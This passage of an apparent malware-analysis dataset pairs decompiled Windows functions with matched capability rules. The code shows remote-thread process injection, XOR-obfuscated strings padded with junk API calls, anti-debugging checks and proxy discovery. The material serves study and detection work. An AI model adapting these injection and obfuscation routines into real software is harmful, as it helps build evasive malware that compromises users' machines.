!= 0x7b0fea) {\n                    *(iVar18 + iVar3) = (&stack0xffffffa4)[iVar18 % 5] ^ (iVar18 + iVar3)[uStack100];\n                }\n                iVar18 = iVar18 + 1;\n            } while (iVar18 < 10);\n            uStack44 = 0x729241b;\n            uStack40 = 0x24280208;\n            uStack36 = 0x2091120;\n            uStack32 = 0x362d043b;\n            uStack28 = 0x1f;\n            uStack27 = 6;\n            uStack26 = 0x502d;\n            uStack92 = 0x44455049;\n            uStack88 = CONCAT22(uStack88._2_2_, 0x677a);\n            uVar12 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar12);\n            iVar18 = 0;\n            uStack112 = &stack0xffffffc8 + -iVar3;\n            uVar12 = 0xffffffff;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n                if (iVar4 != 0xb989df) {\n                    *(iVar18 + iVar3) = (&stack0xffffff98)[iVar18 % piStack140] ^ (iVar18 + iVar3)[uStack112];\n                }\n                iVar18 = iVar18 + 1;\n            } while (iVar18 < 0x14);\n            uVar8 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iStack116, iVar3);\n            pcVar10 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar8);\n            if (pcVar10 != NULL) {\n                iVar18 = (*pcVar10)(*arg_8h, 0, 0, 0, 0, 0, lpStartAddress, lpParameter, puVar9, &stack0xffffff94);\n                if (iVar18 < 0) {\n                    uVar12 = fcn.0040edc3();\n                }\n                else {\n                    uStack124 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*puVar9, 30000);\n                    if (uStack124 == NULL) {\n                        (*_sym.imp.KERNEL32.dll_GetExitCodeThread)(*puVar9, &stack0xffffff84);\n                    }\n                    uVar12 = 0;\n                }\n            }\n            uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            pcVar10 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n            uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iStack116);\n            (*pcVar10)(uVar8);\n            goto code_r0x00404389;\n        }\n        piStack140 = arg_8h + 3;\n        iVar3 = (*_sym.imp.KERNEL32.dll_CreateRemoteThread)(*arg_8h, 0, 0, lpStartAddress, lpParameter, 0);\n        *piVar13 = iVar3;\n        if (iVar3 == 0) {\n            uVar12 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            goto code_r0x00404389;\n        }\n        uStack124 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(iVar3, 30000);\n        if (uStack124 == NULL) {\n            (*_sym.imp.KERNEL32.dll_GetExitCodeThread)(*piVar13, &stack0xffffff84);\n        }\n    }\n    uVar12 = 0;\ncode_r0x00404389:\n    *0x41cdec = *0x41cde8 >> 0x20;\n    *0x41cde4 = *0x41cde0 >> 0x20;\n    return uVar12;\n}\n",
        "token_count": 5301
    },
    "00407b3b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00407b3b(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if ((arg_8h & 0x20006) == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000001);\n    }\n    else {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)(0x80000001);\n    }\n    uVar2 = 0;\n    if (iVar1 == 0) {\n        uVar2 = arg_8h;\n    }\n    return uVar2;\n}\n",
        "token_count": 152
    },
    "0040a6c9": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a6c9(uint arg_8h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    ushort uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    int32_t iVar8;\n    int16_t *piVar9;\n    uchar *puVar10;\n    uint32_t *puVar11;\n    int32_t iStack580;\n    uint32_t uStack576;\n    uint uStack572;\n    uint32_t uStack568;\n    uint32_t uStack564;\n    int32_t iStack552;\n    uchar auStack544 [16];\n    int16_t iStack528;\n    uchar auStack526 [522];\n    \n    uStack576 = 0;\n    iStack580 = 0;\n    puVar10 = auStack544;\n    for (iVar8 = 0x10; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    puVar11 = &uStack568;\n    for (iVar8 = 0x18; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    piVar9 = &iStack528;\n    for (iVar8 = 0x208; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *piVar9 = 0;\n        piVar9 = piVar9 + 1;\n    }\n    if (*0x41cb48 == 0) {\n        *0x41cb7c = fcn.0040a23e();\n        uVar6 = *0x41cd8c;\n        iVar8 = *0x41cd88;\n    }\n    else {\n        *0x41cb7c = fcn.00409f19();\n        iVar5 = fcn.0040f720(&iStack580);\n        uVar6 = uStack576;\n        iVar8 = iStack580;\n        if (iVar5 != 0) goto code_r0x0040a782;\n    }\n    uStack564 = uVar6 >> 0x1f;\n    uStack568 = uVar6;\n    iStack552 = iVar8;\ncode_r0x0040a782:\n    iVar8 = iStack552;\n    uVar3 = uStack564;\n    uVar6 = uStack568;\n    if (*0x41cb7c == 0) {\n        piVar9 = &iStack528;\n        do {\n            iVar1 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar1 != 0);\n        if (piVar9 - auStack526 >> 1 != 0) {\n            uVar4 = (*_sym.imp.KERNEL32.dll_FindAtomW)(&iStack528);\n            (*_sym.imp.KERNEL32.dll_DeleteAtom)(uVar4);\n        }\n    }\n    else {\n        fcn.0040836f();\n        if ((iVar8 != 0) && ((uVar6 | uVar3) != 0)) {\n            fcn.0040ec71();\n            fcn.00403980((*0x41cb44 & 1) << 4);\n        }\n        uStack576 = *0x41cb7c;\n        uStack572 = *0x41cb34;\n        (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(2, &uStack576, 0, 0xffffffff);\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(*0x41cb7c, 0);\n        uVar7 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040a6c9, arg_8h, 0, 0);\n        pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar7);\n        (*pcVar2)(*0x41cb7c);\n    }\n    (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 967
    },
    "0040d1ea": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040d1ea(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint extraout_ECX;\n    int32_t iVar4;\n    int32_t lpBuffer;\n    int32_t lpNumberOfBytesRead;\n    uint lpFileName;\n    int32_t lDistanceToMove;\n    int32_t var_4h;\n    \n    iVar4 = 0;\n    var_4h = 0;\n    iVar2 = fcn.0040e0ce();\n    if (iVar2 == 0) {\n        iVar2 = fcn.00405964(extraout_ECX);\n        if ((iVar2 != 0) && (lDistanceToMove = fcn.004059ea(),  lDistanceToMove != 0)) {\n            cVar1 = '\\0';\n            if (((*0x41cb44 & 1) != 0) && (*(*(param_1 + 0x3c) + 4 + param_1) == 0x14c)) {\n                cVar1 = fcn.0040d06c();\n                cVar1 = '\\x01' - (cVar1 != '\\0');\n            }\n            iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 0x80000000, 1, 0, 3, 0x80, 0);\n            if (iVar4 != -1) {\n                iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointer)(iVar4, lDistanceToMove, 0, 0);\n                if (((iVar2 == lDistanceToMove) &&\n                    (iVar2 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar4, &lpBuffer, 4, &lpNumberOfBytesRead, 0), \n                    iVar2 != 0)) && (lpNumberOfBytesRead == 4)) {\n                    var_4h = lpBuffer + param_1;\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n            }\n            iVar4 = var_4h;\n            if (cVar1 != '\\0') {\n                fcn.0040d06c();\n                iVar4 = var_4h;\n            }\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFileName);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return iVar4;\n}\n",
        "token_count": 541
    },
    "00401484": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00401484(uint param_1, uchar *param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint uVar8;\n    uint *puVar9;\n    bool bVar10;\n    uint pszFile;\n    uint32_t pAutoProxyOptions;\n    uint32_t var_54h;\n    int32_t var_50h;\n    uint uStack80;\n    uint uStack76;\n    uint var_44h;\n    int32_t var_40h;\n    int32_t pProxyConfig;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint32_t pszSrch;\n    uchar *psz1;\n    int32_t var_24h;\n    int32_t lpcwszUrl;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint pProxyInfo;\n    int32_t psz2;\n    int32_t var_8h;\n    uchar uStack8;\n    uint var_3h;\n    \n    var_14h = 0;\n    puVar9 = &pProxyConfig;\n    psz1 = param_2;\n    for (iVar6 = 4; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    puVar9 = &pszFile;\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *param_2 = 0;\n        param_2 = param_2 + 1;\n    }\n    iVar6 = (*_sym.imp.WINHTTP.dll_WinHttpGetIEProxyConfigForCurrentUser)(&pProxyConfig);\n    if ((iVar6 != 0) && (iVar6 = fcn.00401430(),  iVar6 != 0)) {\n        uVar8 = 1;\n        if (((pProxyConfig != 0) || (var_38h != 0)) &&\n           (iVar6 = (*_sym.imp.WINHTTP.dll_WinHttpOpen)(0, 1, 0, 0, 0),  iVar6 != 0)) {\n            bVar10 = pProxyConfig != 0;\n            var_50h = 0;\n            uStack80 = 0;\n            uStack76 = 0;\n            var_54h = bVar10;\n            pAutoProxyOptions = bVar10;\n            if (var_38h != 0) {\n                pAutoProxyOptions = bVar10 | 2;\n                var_50h = var_38h;\n            }\n            var_44h = 1;\n            puVar9 = &pProxyInfo;\n            for (iVar7 = 4; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            iVar7 = (*_sym.imp.WINHTTP.dll_WinHttpGetProxyForUrl)(iVar6, lpcwszUrl, &pAutoProxyOptions, &pProxyInfo);\n            if ((iVar7 != 0) && (psz2 != 0)) {\n                (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, psz2);\n                (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar6);\n                pcVar2 = _sym.imp.KERNEL32.dll_GlobalFree;\n                if (psz2 != 0) {\n                    (*_sym.imp.KERNEL32.dll_GlobalFree)(psz2);\n                }\n                if (var_8h != 0) {\n                    (*pcVar2)(var_8h);\n                }\n                goto code_r0x00401781;\n            }\n            (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar6);\n            pcVar2 = _sym.imp.KERNEL32.dll_GlobalFree;\n            if (psz2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GlobalFree)(psz2);\n            }\n            if (var_8h != 0) {\n                (*pcVar2)(var_8h);\n            }\n        }\n        if (var_34h != 0) {\n            if (var_30h == 0) {\ncode_r0x004015fa:\n                iVar6 = var_34h;\n                iVar7 = fcn.0040e5f0();\n                pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (iVar7 == 0) {\n                    (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, iVar6);\n                    goto code_r0x00401781;\n                }\n                pProxyInfo = 0x76257158;\n                psz2 = 0x5101301c;\n                var_40h = 5;\n                var_8h = 0x710a6805;\n                uStack8 = 0x51;\n                var_3h._0_1_ = 0x76;\n                var_1ch = 0x76517130;\n                var_18h._0_2_ = CONCAT11(var_18h._1_1_, 0x68);\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1d);\n                iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n                var_14h = 0;\n                var_24h = &pProxyInfo - iVar6;\n                pszSrch = iVar6;\n                do {\n                    iVar7 = (*pcVar2)();\n                    if (iVar7 != 0x923699) {\n                        *(var_14h + iVar6) = *(&var_1ch + var_14h % var_40h) ^ (var_14h + iVar6)[var_24h];\n                    }\n                    var_14h = var_14h + 1;\n                } while (var_14h < 0xe);\n                pProxyInfo = 0x643d330a;\n                psz2 = 0x33123240;\n                var_8h = 0x3234643a;\n                var_1ch = 0x64493362;\n                var_18h._0_2_ = 0x3234;\n                uVar8 = (*pcVar2)(8, 0x19);\n                iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n                iVar7 = 0;\n                var_24h = &pProxyInfo - iVar6;\n                do {\n                    iVar4 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n                    iVar3 = pszSrch;\n                    if (iVar4 != 0x353b43) {\n                        var_24h = 6;\n                        *(iVar7 + iVar6) = *(&var_1ch + iVar7 % 6) ^ (iVar7 + iVar6)[&pProxyInfo - iVar6];\n                    }\n                    iVar7 = iVar7 + 1;\n                } while (iVar7 < 0xc);\n                iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(lpcwszUrl, pszSrch);\n                pszSrch = iVar7 == lpcwszUrl;\n                var_14h = 0;\n                lpcwszUrl = fcn.0040e616(&var_14h);\n                uVar8 = 1;\n                while (pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap,  lpcwszUrl != 0) {\n                    iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(lpcwszUrl, iVar6);\n                    if ((pszSrch == (iVar7 == lpcwszUrl)) && (iVar7 = fcn.0040e5f0(),  iVar7 != 0)) {\n                        (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, iVar7 + 2);\n                        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n                        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                        (*pcVar2)(uVar5);\n                        goto code_r0x00401781;\n                    }\n                    lpcwszUrl = fcn.0040e616(&var_14h);\n                }\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n                uVar8 = (*pcVar2)(0, iVar3);\n                (*pcVar1)(uVar8);\n            }\n            else {\n                do {\n                    iVar6 = fcn.0040e616(&var_14h);\n                    if (iVar6 == 0) goto code_r0x004015fa;\n                    iVar6 = (*_sym.imp.SHLWAPI.dll_PathMatchSpecW)(&pszFile, iVar6);\n                } while (iVar6 == 0);\n            }\n        }\n    }\n    uVar8 = 0;\ncode_r0x00401781:\n    pcVar2 = _sym.imp.KERNEL32.dll_GlobalFree;\n    if (var_38h != 0) {\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(var_38h);\n    }\n    if (var_34h != 0) {\n        (*pcVar2)(var_34h);\n    }\n    if (var_30h != 0) {\n        (*pcVar2)(var_30h);\n    }\n    return uVar8;\n}\n",
        "token_count": 2272
    },
    "004028fa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004028fa(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    code *pcVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint var_358h;\n    uint var_150h;\n    uint var_110h;\n    uint var_d0h;\n    uint var_c4h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uchar *var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uchar var_14h;\n    uint32_t var_10h;\n    uchar var_ch;\n    uint32_t var_bh;\n    uint var_7h;\n    uint var_3h;\n    \n    var_b4h = 0x208;\n    iVar2 = fcn.00401fd8();\n    if (iVar2 == 0) {\n        fcn.00402215();\n        fcn.0040b2d7();\n        while ((iVar2 = fcn.0040bff2(),  iVar2 != 0 || (iVar2 = fcn.0040c05c(),  iVar2 != 0))) {\n            (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n        }\n    }\n    pcVar6 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    iVar2 = (*_sym.imp.KERNEL32.dll_VirtualProtect)(0x4122f0, 0x184, 0x40, &var_a4h);\n    if (iVar2 != 0) {\n        fcn.0040628d();\n        (*pcVar6)(0x4122f0, 0x184, var_a4h, &var_a4h);\n    }\n    puVar7 = 0x41cac0;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    fcn.00405f38();\n    puVar9 = &var_d0h;\n    for (iVar2 = 0x1c; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    puVar9 = &var_b0h;\n    for (iVar2 = 0xc; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    puVar7 = 0x41caa4;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar9 = &var_358h;\n    for (iVar2 = 0x208; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    iVar2 = (*_sym.imp.ADVAPI32.dll_GetUserNameW)(&var_358h, &var_b4h);\n    var_44h = 6;\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar2 != 0) {\n        var_28h = 0x70234a0f;\n        var_24h = 0x4a086204;\n        var_20h = 0x6200703e;\n        var_1ch._0_1_ = 0x17;\n        var_1ch._1_1_ = 0x4a;\n        var_1ch._2_2_ = 0x7035;\n        var_18h._0_1_ = 0x41;\n        var_18h._1_1_ = 0x62;\n        var_bh = var_bh & 0xffffff | 0x5a000000;\n        var_7h = 0x4170704a;\n        var_3h._0_1_ = 0x62;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar8 = 0;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetMessagePos)();\n            if (iVar4 != 0xfbb0a4) {\n                *(iVar8 + iVar2) = *(&var_bh + iVar8 % var_44h + 3) ^ (iVar8 + iVar2)[&var_28h - iVar2];\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 0x12);\n        (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableW)(iVar2, &var_358h);\n        pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    iVar2 = fcn.004017dd();\n    var_54h = 5;\n    if (iVar2 != 0) {\n        if (2 < var_d0h._1_1_) {\n            iVar2 = 0;\n            if (0 < var_d0h._1_1_ - 2) {\n                do {\n                    *0x41caac = *0x41caac + (&var_c4h)[iVar2];\n                    iVar2 = iVar2 + 1;\n                } while (iVar2 < var_d0h._1_1_ - 2);\n            }\n        }\n        *0x41caac = *0x41caac ^ 0x43103655;\n        iVar2 = fcn.004020be();\n        if (iVar2 != 0) {\n            if (*0x41cb40 < 6) {\n                var_a0h = 0x3d44601e;\n                var_9ch = 0x1913026b;\n                var_98h = 0xc174225;\n                var_94h = 0x3b576161;\n                var_90h = 0x1e726417;\n                var_8ch = 0xe193657;\n                var_88h = 0x382b6113;\n                var_84h = 0x1b61766b;\n                var_80h = 0xc785022;\n                var_7ch = 0x3a251561;\n                var_78h = 0x1b1d7619;\n                var_74h = 0xc6b4257;\n                var_70h = 0x3844730f;\n                var_6ch = 0x1913026b;\n                var_68h = 0xc174225;\n                var_64h = 0x3b576161;\n                var_60h._0_2_ = 0x6411;\n                var_60h._2_1_ = 0x5a;\n                var_bh = var_bh & 0xffffff | 0x5a000000;\n                var_7h = 0x50796c5a;\n                var_3h._0_1_ = 0x4d;\n                uVar3 = (*pcVar6)(8, 0x44);\n                iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                iVar8 = 0;\n                var_48h = &var_a0h - iVar2;\n                do {\n                    iVar4 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n                    if (iVar4 != 0x74d4c9) {\n                        *(iVar8 + iVar2) = *(&var_bh + iVar8 % var_44h + 3) ^ (iVar8 + iVar2)[var_48h];\n                    }\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < 0x43);\n            }\n            else {\n                var_24h = 0x23635902;\n                var_20h = 0x5586a18;\n                var_1ch._0_1_ = 0x39;\n                var_1ch._1_1_ = 0x6f;\n                var_1ch._2_2_ = 0x586a;\n                var_18h._0_1_ = 7;\n                var_18h._1_1_ = 0x39;\n                var_18h._2_2_ = 0x517d;\n                var_3ch = 0x6e4b6351;\n                var_38h._0_1_ = 0x54;\n                uVar3 = (*pcVar6)(8, 0x11);\n                iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                iVar8 = 0;\n                var_48h = &var_24h - iVar2;\n                do {\n                    iVar4 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n                    if (iVar4 != 0x869623) {\n                        *(iVar8 + iVar2) = *(&var_3ch + iVar8 % var_54h) ^ (iVar8 + iVar2)[var_48h];\n                    }\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < 0x10);\n            }\n            var_b0h = 0xc;\n            var_a8h = 0;\n            var_ach = 0;\n            (*_sym.imp.ADVAPI32.dll_ConvertStringSecurityDescriptorToSecurityDescriptorA)(iVar2, 1, &var_ach, 0);\n            uVar3 = (*pcVar6)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n    }\n    *0x41cab4 = fcn.004027b3();\n    *0x41cab4 = *0x41cab4 & 0xffff;\n    var_10h._0_1_ = 6;\n    stack0xffffffed = 0x16312100;\n    var_bh = 0xa211000;\n    var_7h = 0x361d0f10;\n    var_3h._0_1_ = 0x6e;\n    var_3ch = 0x6e447863;\n    var_38h._0_1_ = 0x65;\n    uVar3 = (*pcVar6)(8, 0xf);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_5ch = &var_10h - iVar2;\n    var_48h = iVar2;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n        if (iVar4 != 0xab00c8) {\n            *(iVar8 + iVar2) = *(&var_3ch + iVar8 % var_54h) ^ (iVar8 + iVar2)[var_5ch];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xe);\n    var_24h = 0x2955181b;\n    var_20h = 0x3043217;\n    var_1ch._0_1_ = 0x5a;\n    var_1ch._1_1_ = 0x22;\n    var_1ch._2_2_ = 0x271e;\n    var_18h._0_1_ = 5;\n    var_18h._1_1_ = 0x6c;\n    var_bh = var_bh & 0xffffff | 0x68000000;\n    var_7h = 0x7347346c;\n    var_3h._0_1_ = 0x53;\n    uVar3 = (*pcVar6)(8, 0xf);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_2ch = NULL;\n    var_40h = &var_24h - iVar2;\n    var_5ch = iVar2;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n        if (iVar8 != 0xcc6b60) {\n            *(var_2ch + iVar2) = *(&var_bh + var_2ch % var_44h + 3) ^ (var_2ch + iVar2)[var_40h];\n        }\n        var_2ch = var_2ch + 1;\n    } while (var_2ch < 0xe);\n    var_bh = var_bh & 0xffffff | 0x4a000000;\n    var_7h = 0x769153d;\n    var_3h._0_1_ = 0x30;\n    var_50h = 0x4c4a4e6f;\n    var_4ch._0_2_ = 0x3063;\n    uVar3 = (*pcVar6)(8, 7);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_40h = &var_bh + (3 - iVar2);\n    var_3ch = iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n        if (iVar4 != 0x6f377f) {\n            *(iVar8 + iVar2) = *(&var_50h + iVar8 % var_44h) ^ (iVar8 + iVar2)[var_40h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 6);\n    (*_sym.imp.USER32.dll_wsprintfA)(&var_110h, iVar2, var_48h, *0x412430);\n    *0x41cb48 = fcn.00406317();\n    *0x41cab4 = 6000;\n    var_2ch = var_2ch & 0xff000000 | 0x611151;\n    var_bh = var_bh & 0xffffff | 0x74000000;\n    var_7h = 0x70346175;\n    var_3h._0_1_ = 0x62;\n    uVar3 = (*pcVar6)(8, 4);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_40h = &var_2ch - iVar2;\n    var_50h = iVar2;\n    do {\n        iVar4 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n        if (iVar4 != 0x493848) {\n            *(iVar8 + iVar2) = *(&var_bh + iVar8 % var_44h + 3) ^ (iVar8 + iVar2)[var_40h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 3);\n    (*_sym.imp.USER32.dll_wsprintfA)(&var_150h, iVar2, *0x41cab4);\n    var_34h = 0x5146472c;\n    var_30h._0_1_ = 0x67;\n    var_bh = var_bh & 0xffffff | 0x58000000;\n    var_7h = 0x67343335;\n    var_3h._0_1_ = 0x79;\n    uVar3 = (*pcVar6)(8, 6);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_58h = &var_34h - iVar2;\n    var_40h = iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n        if (iVar4 != 0xd153c) {\n            *(iVar8 + iVar2) = *(&var_bh + iVar8 % var_44h + 3) ^ (iVar8 + iVar2)[var_58h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 5);\n    stack0xffffffed = stack0xffffffed & 0xffffff | 0x20000000;\n    var_bh = 0x10a1812;\n    var_7h = 0xa1f2824;\n    var_3h._0_1_ = 0x6e;\n    var_34h = 0x6e767756;\n    var_30h._0_1_ = 0x6e;\n    uVar3 = (*pcVar6)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_2ch = &var_ch + -iVar2;\n    var_58h = iVar2;\n    do {\n        iVar4 = 